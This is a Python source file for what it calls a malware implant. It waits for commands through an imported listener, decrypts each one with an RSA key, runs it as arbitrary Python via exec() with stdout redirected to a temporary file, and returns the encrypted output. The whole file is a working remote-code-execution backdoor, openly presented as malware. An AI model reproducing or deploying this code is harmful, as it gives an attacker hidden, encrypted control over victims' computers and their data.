import sys
from malware.settings import RSA_KEY
from general.enc_layer import encrypt_data, decrypt_and_validate_data
from malware.listener import listen_for_commands
import os


def handle_receive(command: str) -> bytes:
    """
    The classic on_recv function for the malware. Executes provided command and returns the output.
    @param command Python code to execute.
    @return output of command through the 'out' file. Exception string if thrown.
    """
    exec(wrap(command))
    with open('out.txt', 'r') as f:
        a = f.readlines()
    os.remove('out.txt')
    return "\n".join(a).encode('utf-8')


def encrypted_handle_receive(command: str) -> bytes:
    """
    The classic handle_receive with the addition of the encryption layer.
    @param command encrypted Python code to execute.
    @return encrypted output of command through the 'out' file. Exception string if thrown.
    """
    command_dec = decrypt_and_validate_data(command.encode('utf-8'), RSA_KEY)
    return encrypt_data(handle_receive(command_dec).decode('utf-8'), RSA_KEY)


def wrap(command: str) -> str:
    ans = "f=open ('out.txt','w')\norg=sys.stdout\nsys.stdout = f\n"
    ans += command + "\n"
    ans += "f.close()\nsys.stdout=org\n"
    return ans


def main():
    listen_for_commands(encrypted_handle_receive)
